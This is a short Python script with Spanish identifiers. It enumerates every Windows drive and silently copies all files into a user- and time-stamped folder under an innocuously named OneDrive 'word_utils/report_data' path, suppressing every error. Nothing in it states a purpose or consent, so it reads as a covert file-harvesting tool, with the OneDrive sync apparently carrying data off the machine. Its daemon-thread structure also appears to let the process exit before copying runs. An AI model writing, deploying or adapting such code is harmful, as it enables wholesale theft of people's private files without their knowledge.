import os
import shutil
import string
import datetime
import getpass
import threading

def copiar_archivos(origen, destino):
    for root, _, archivos in os.walk(origen):
        for archivo in archivos:
            try:
                ruta_archivo = os.path.join(root, archivo)
                ruta_relativa = os.path.relpath(ruta_archivo, origen)
                ruta_destino = os.path.join(destino, ruta_relativa)

                os.makedirs(os.path.dirname(ruta_destino), exist_ok=True)
                shutil.copy2(ruta_archivo, ruta_destino)
            except Exception:
                pass  # Ignora errores

def escanear_discos(destino_base):
    letras = string.ascii_uppercase
    for letra in letras:
        ruta = f"{letra}:\\"
        if os.path.exists(ruta):
            nombre = f"Unidad_{letra}"
            destino = os.path.join(destino_base, nombre)
            threading.Thread(target=copiar_archivos, args=(ruta, destino), daemon=True).start()

def main():
    usuario = getpass.getuser()
    fecha = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    # Nueva ruta de destino
    carpeta_base = os.path.join("C:\\Users\\aldai\\OneDrive\\Desktop\\Word\\word_utils", "report_data")
    carpeta_destino = os.path.join(carpeta_base, f"{usuario}_{fecha}")

    os.makedirs(carpeta_destino, exist_ok=True)
    escanear_discos(carpeta_destino)

if __name__ == "__main__":
    threading.Thread(target=main, daemon=True).start()
